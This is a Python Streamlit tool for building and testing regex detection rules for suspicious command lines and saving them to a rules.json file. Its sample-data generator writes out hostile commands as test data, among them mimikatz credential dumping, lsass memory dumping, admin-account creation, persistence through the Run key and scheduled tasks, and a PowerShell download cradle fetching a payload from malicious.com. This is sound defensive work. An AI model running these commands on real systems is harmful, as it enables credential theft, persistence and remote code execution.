import json
import re
import time
from pathlib import Path
from typing import Dict, Any, List, Optional

import pandas as pd
import streamlit as st


# ===================== CONFIG =====================

DEFAULT_RULES_PATH = r"C:\Code_Projects\rules.json"
DEFAULT_COMMANDS_CSV = r"C:\Code_Projects\Commands.csv"
BACKUP_DIR = r"C:\Code_Projects\backups"

CSV_READ_ENCODING = "utf-8-sig"   # Excel-friendly
CSV_WRITE_ENCODING = "utf-8-sig"  # Excel-friendly


# ===================== UTILITIES =====================

def clean_path(p: str) -> Path:
    cleaned = str(p).strip().strip('"').strip("'")
    return Path(cleaned).expanduser().resolve()

def load_json(path: Path) -> Dict[str, Any]:
    with path.open("r", encoding="utf-8") as f:
        return json.load(f)

def dump_json(data: Dict[str, Any], path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def backup_file(src: Path) -> Path:
    ts = time.strftime("%Y%m%d-%H%M%S")
    dest_dir = clean_path(BACKUP_DIR)
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest = dest_dir / (src.stem + f".{ts}" + src.suffix)
    dest.write_bytes(src.read_bytes())
    return dest

def ensure_location(block: Dict[str, Any], os_name: str, category: str):
    if os_name not in block:
        block[os_name] = {}
    if category not in block[os_name]:
        block[os_name][category] = []

def validate_regex(pattern: str):
    try:
        re.compile(pattern)
    except re.error as e:
        raise ValueError(f"Regex failed to compile: {e}")

def list_categories(rules: Dict[str, Any], os_name: str) -> List[str]:
    if os_name not in rules or not isinstance(rules[os_name], dict):
        return []
    return sorted([k for k in rules[os_name].keys() if not str(k).startswith("_")])

def read_candidates_from_csv(csv_path: Path, limit: Optional[int] = None) -> List[str]:
    if not csv_path.exists():
        return []
    df = pd.read_csv(csv_path, encoding=CSV_READ_ENCODING)
    df.columns = [c.lower() for c in df.columns]
    if "commandline" not in df.columns:
        return []
    series = df["commandline"].astype(str)
    if limit:
        series = series.head(limit)
    return [s.lower() for s in series.tolist()]

def dry_run_matches(pattern: str, candidates: List[str], max_show: int = 25) -> Dict[str, Any]:
    regex = re.compile(pattern)
    hits = [c for c in candidates if regex.search(c)]
    preview = hits[:max_show]
    return {"total": len(candidates), "hit_count": len(hits), "preview": preview}

def generalize_regex_from_examples(positives: List[str]) -> str:
    """
    Heuristic generator: creates a reasonable regex from 1..N positive examples.
    Assumes inputs are command lines and should be lowercased before matching.
    """
    examples = [e.strip().lower() for e in positives if e.strip()]
    if not examples:
        return r".+"

    if len(examples) == 1:
        s = re.escape(examples[0])
        s = re.sub(r"(\\ )+", r"\\s+", s)            # spaces -> \s+
        s = re.sub(r"\\d+", r"\\d+", s)              # numbers -> \d+
        s = re.sub(r"[A-Za-z0-9_\\\-]{6,}", r"[^\s\"]+", s)  # long tokens -> non-space
        return s

    tokens_list = [re.split(r"\s+", e) for e in examples]
    max_len = max(len(t) for t in tokens_list)
    cols = []
    for i in range(max_len):
        col = []
        for row in tokens_list:
            if i < len(row):
                col.append(row[i])
        cols.append(col)

    def col_pattern(tokens_at_pos: List[str]) -> str:
        uniq = set(tokens_at_pos)
        if len(uniq) == 1:
            return re.escape(list(uniq)[0])
        if all(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", t) for t in tokens_at_pos if t):
            return r"\d{1,3}(?:\.\d{1,3}){3}"
        if all(re.match(r"^\d+$", t) for t in tokens_at_pos if t):
            return r"\d+"
        if all(("\\" in t or "/" in t) for t in tokens_at_pos if t):
            return r"[^\s\"]+"
        return r"\S+"

    parts = [col_pattern(col) for col in cols]
    return r"\s+".join(parts)


# ===================== APP SETUP =====================

st.set_page_config(page_title="CommandLine Analyzer - Rules Wizard", page_icon="🛡️", layout="wide")

# Session state defaults
if "rules" not in st.session_state:
    st.session_state.rules = None
if "rules_path" not in st.session_state:
    st.session_state.rules_path = None
if "generated_pattern" not in st.session_state:
    st.session_state.generated_pattern = ""
if "dryrun_outcome" not in st.session_state:
    st.session_state.dryrun_outcome = None

st.title("🛡️ CommandLine Analyzer — Rules Wizard (No‑AI)")
st.caption("Create, test, and insert detection rules without editing JSON or writing regex manually.")


# ===================== SIDEBAR =====================

with st.sidebar:
    st.header("Paths & Files")
    rules_path_str = st.text_input("rules.json path", value=DEFAULT_RULES_PATH)
    csv_path_str = st.text_input("Commands.csv path (optional)", value=DEFAULT_COMMANDS_CSV)

    # Try auto-load if not yet loaded and path exists
    auto_load_clicked = st.button("🔄 Reload rules.json")

    st.markdown("---")
    st.write("Or upload a rules.json file:")
    uploaded_rules = st.file_uploader("Upload rules.json", type=["json"], key="rules_upload")

    st.markdown("---")
    st.write("Or upload a Commands CSV to test against:")
    uploaded_csv = st.file_uploader("Upload Commands CSV", type=["csv"], key="csv_upload")

    st.markdown("---")
    generate_sample_btn = st.button("🧪 Generate sample Commands.csv")


# ===================== LOAD RULES (robust) =====================

def attempt_load_rules_from_path(path_str: str) -> Optional[Dict[str, Any]]:
    try:
        rp = clean_path(path_str)
        if not rp.exists():
            return None
        data = load_json(rp)
        st.session_state.rules = data
        st.session_state.rules_path = rp
        return data
    except Exception as e:
        st.error(f"Failed to load rules.json from path: {e}")
        return None

def attempt_load_rules_from_upload(upload) -> Optional[Dict[str, Any]]:
    try:
        if upload is None:
            return None
        data = json.load(upload)
        # Set an in-memory path note
        st.session_state.rules = data
        st.session_state.rules_path = None  # uploaded (not on disk)
        return data
    except Exception as e:
        st.error(f"Failed to parse uploaded rules.json: {e}")
        return None

# Auto-load on first run if possible
if st.session_state.rules is None:
    data = attempt_load_rules_from_path(rules_path_str)
    if data:
        st.success(f"Loaded rules.json from: {clean_path(rules_path_str)}")

# Manual reload button
if auto_load_clicked:
    data = attempt_load_rules_from_path(rules_path_str)
    if data:
        st.success(f"Reloaded rules.json from: {clean_path(rules_path_str)}")

# Uploaded rules file overrides current rules
if uploaded_rules is not None:
    data = attempt_load_rules_from_upload(uploaded_rules)
    if data:
        st.success("Loaded rules.json from uploaded file.")


# Generate a sample CSV (optional)
if generate_sample_btn:
    try:
        sample_rows = [
            {"CommandLine": "net user eviluser P@ssw0rd! /add"},
            {"CommandLine": "net localgroup administrators eviluser /add"},
            {"CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EvilApp /t REG_SZ /d \"C:\\Temp\\evil.exe\" /f"},
            {"CommandLine": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp"},
            {"CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"},
            {"CommandLine": "cmd.exe /Q /C whoami 1> \\\\127.0.0.1\\ADMIN$\\__123456789 2>&1"},
            {"CommandLine": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\""},
            {"CommandLine": "schtasks /create /tn updater /tr \"cmd.exe /c calc\" /sc onstart"},
            {"CommandLine": "wget http://example.com/file.bin -O /tmp/file.bin"},
            {"CommandLine": "curl http://example.com/payload -o /tmp/payload"},
            {"CommandLine": "echo 'mal' >> ~/.bashrc"}
        ]
        sample_df = pd.DataFrame(sample_rows)
        dest = clean_path(csv_path_str)
        dest.parent.mkdir(parents=True, exist_ok=True)
        sample_df.to_csv(dest, index=False, encoding=CSV_WRITE_ENCODING)
        st.success(f"Sample Commands.csv written to: {dest}")
    except Exception as e:
        st.error(f"Failed to write sample CSV: {e}")


st.markdown("---")

# HARD GUARD: If rules are still not loaded, stop here gracefully
if st.session_state.rules is None:
    st.info("👈 Load your **rules.json** from the sidebar (path or upload) to get started.")
    st.stop()

# From here on, rules are guaranteed non-None
rules: Dict[str, Any] = st.session_state.rules


# ===================== MAIN FORM =====================

col1, col2, col3 = st.columns([1, 1, 2])

with col1:
    if rules is not None:
        os_options = [k for k in rules.keys() if not str(k).startswith("_")]
        if not os_options:
            st.error("No OS blocks found in rules.json (e.g., 'Windows', 'Linux', 'macOS', 'Cross-Platform').")
            st.stop()
        os_name = st.selectbox("Operating System", options=os_options, index=0)
    else:
        st.error("rules.json file not found or could not be loaded.")
        st.stop()

with col2:
    if 'os_name' in locals() or 'os_name' in globals():  # Only execute if os_name is defined (in Streamlit context)
        existing_categories = list_categories(rules, os_name)
        use_new_category = st.toggle("New Category?", value=False)
        if use_new_category:
            category = st.text_input("Create new category", placeholder="e.g., Lateral Movement / Impacket")
        else:
            if not existing_categories:
                st.warning(f"No categories found under {os_name}. Enter a new category name.")
                category = st.text_input("Create new category", placeholder="e.g., Other Suspicious / Malicious Patterns")
            else:
                category = st.selectbox("Category", options=existing_categories)
    else:
        # Fallback for when imported directly (not in Streamlit context)
        category = "Default Category"

with col3:
    description = st.text_input("Rule Description", placeholder="Short description, e.g., Impacket PsExec-like output redirection to ADMIN$")

st.markdown("### Examples & Pattern")

colA, colB = st.columns(2)
with colA:
    positives_text = st.text_area("Positive examples (one per line)", height=160, placeholder="e.g.\ncmd.exe /Q /C whoami 1> \\\\127.0.0.1\\ADMIN$\\__123456789 2>&1\nnet user eviluser P@ssw0rd! /add")
with colB:
    negatives_text = st.text_area("Negative examples (optional, one per line)", height=160, placeholder="Non-matching examples (optional)")

pattern = st.text_input(
    "Regex pattern (Python 're', matched against LOWERCASED commands)",
    value=st.session_state.generated_pattern or "",
    placeholder=r"e.g., cmd\.exe\s+/q\s+/c\s+.+\s+1>\s*\\\\127\.0\.0\.1\\admin\$\s*\\__\d+\s+2>&1"
)

colG1, colG2, colG3 = st.columns([1,1,1])

def parse_lines(txt: str) -> List[str]:
    return [ln.strip() for ln in (txt or "").splitlines() if ln.strip()]

with colG1:
    if st.button("✨ Generate pattern from examples"):
        pos = parse_lines(positives_text)
        if not pos:
            st.warning("Add at least one positive example.")
        else:
            try:
                gen = generalize_regex_from_examples(pos)
                st.session_state.generated_pattern = gen
                st.success("Pattern generated from examples. You can still edit it.")
                st.experimental_rerun()
            except Exception as e:
                st.error(f"Failed to generate pattern: {e}")

with colG2:
    if st.button("✅ Validate pattern"):
        try:
            validate_regex(pattern)
            st.success("Regex compiled successfully.")
        except Exception as e:
            st.error(str(e))

def get_candidates() -> List[str]:
    if uploaded_csv is not None:
        try:
            up_df = pd.read_csv(uploaded_csv, encoding=CSV_READ_ENCODING)
            up_df.columns = [c.lower() for c in up_df.columns]
            if "commandline" not in up_df.columns:
                st.error("Uploaded CSV missing 'CommandLine' column.")
                return []
            return [str(x).lower() for x in up_df["commandline"].tolist()]
        except Exception as e:
            st.error(f"Failed to read uploaded CSV: {e}")
            return []
    else:
        return read_candidates_from_csv(clean_path(csv_path_str), limit=None)

with colG3:
    if st.button("🧪 Dry-run on CSV"):
        if not pattern:
            st.warning("Provide a regex pattern first.")
        else:
            try:
                validate_regex(pattern)
                candidates = get_candidates()
                if not candidates:
                    st.info("No candidates found. Upload a CSV or set a valid path in the sidebar.")
                else:
                    outcome = dry_run_matches(pattern, candidates, max_show=50)
                    st.session_state.dryrun_outcome = outcome
                    st.success(f"Dry-run complete. Hits: {outcome['hit_count']} / {outcome['total']}")
            except Exception as e:
                st.error(f"Dry-run failed: {e}")

# Show dry-run preview
if st.session_state.dryrun_outcome:
    out = st.session_state.dryrun_outcome
    st.markdown("#### Dry-run Preview")
    st.write(f"**Total candidates:** {out['total']}   |   **Matches:** {out['hit_count']}")
    if out["preview"]:
        st.dataframe(pd.DataFrame({"Matched CommandLine": out["preview"]}))
    else:
        st.info("No matches found with current pattern.")

st.markdown("---")
st.subheader("Insert Rule")

insert_col1, insert_col2 = st.columns([1, 2])

with insert_col1:
    confirm_insert = st.button("💾 Insert into rules.json", type="primary")

with insert_col2:
    st.caption("Backs up your rules.json and then appends the new rule under the selected OS and category.")

# Insert action
if confirm_insert:
    try:
        if not os_name:
            st.error("Select an Operating System.")
            st.stop()
        if not category:
            st.error("Select or create a Category.")
            st.stop()
        if not description:
            st.error("Provide a Rule Description.")
            st.stop()
        if not pattern:
            st.error("Provide a Regex pattern or generate it from examples.")
            st.stop()

        # Validate regex
        validate_regex(pattern)

        # Ensure location exists
        ensure_location(rules, os_name, category)

        # Duplicate guard
        existing = rules[os_name][category]
        for r in existing:
            if r.get("pattern") == pattern or r.get("description") == description:
                st.warning("A rule with the same pattern or description already exists in this category. Skipping insert.")
                st.stop()

        # Backup (only if rules live on disk)
        if st.session_state.rules_path:
            backup = backup_file(st.session_state.rules_path)
        else:
            backup = None

        # Insert + save (if on disk). If uploaded (in-memory), just update session and enable download.
        existing.append({"pattern": pattern, "description": description})
        if st.session_state.rules_path:
            dump_json(rules, st.session_state.rules_path)

        if backup:
            st.success(f"Rule inserted under **{os_name} → {category}**. Backup created at: {backup}")
        else:
            st.success(f"Rule inserted under **{os_name} → {category}** (in-memory; download updated JSON below).")
    except Exception as e:
        st.error(f"Failed to insert rule: {e}")

# Download updated rules.json
st.markdown("---")
st.subheader("Export / Download")
try:
    rules_bytes = json.dumps(rules, ensure_ascii=False, indent=2).encode("utf-8")
    st.download_button(
        "⬇️ Download updated rules.json",
        data=rules_bytes,
        file_name="rules.json",
        mime="application/json"
    )
except Exception as e:
    st.error(f"Failed to prepare download: {e}")

st.markdown("---")
st.caption("Tip: Patterns are applied to **lowercased** command lines. Use \\b for word boundaries where helpful.")